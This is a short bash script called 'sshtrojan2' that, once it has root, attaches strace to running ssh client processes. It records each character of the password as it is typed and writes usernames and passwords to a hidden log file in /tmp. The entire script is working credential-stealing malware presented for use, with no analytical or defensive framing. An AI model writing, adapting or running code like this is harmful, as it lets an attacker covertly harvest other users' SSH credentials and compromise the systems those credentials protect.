#!/bin/bash

filelog="/tmp/.log_sshtrojan2.txt"
Usr=""
Passwd=""


if [[ $EUID -ne 0 ]]; then
    echo "You aren't root."
    exit 1
fi


if [[ -e $filelog ]]; then 
    echo "File $filelog was created."
else
    echo "Create file $filelog." 
    touch $filelog
fi

echo "sshtrojan2 is logging username and password into $filelog..."

while true
do
    
    PID=`ps aux | grep -w ssh | grep @ | tail -n 1 | awk {'print $2'}` 
    
    if [[ $PID != "" ]]; then
        
        Usr=`ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d'@' -f1 | tail -n 1`
        
        strace -p $PID -e trace=read --status=successful 2>&1 | while read -r line;
	do
	    char=`echo $line | grep "read(4," | grep ", 1) = 1" | cut -d'"' -f2 | cut -d'"' -f1`
	    if [[ $char == "\\n" ]]; then
		echo "Time:" `date` >> $filelog
		echo "Usr:" $Usr  >> $filelog
		echo -e "Passwd:" $Passwd "\n" >> $filelog				
		break
	    else
		Passwd+=$char
	    fi           
        done
    fi
done
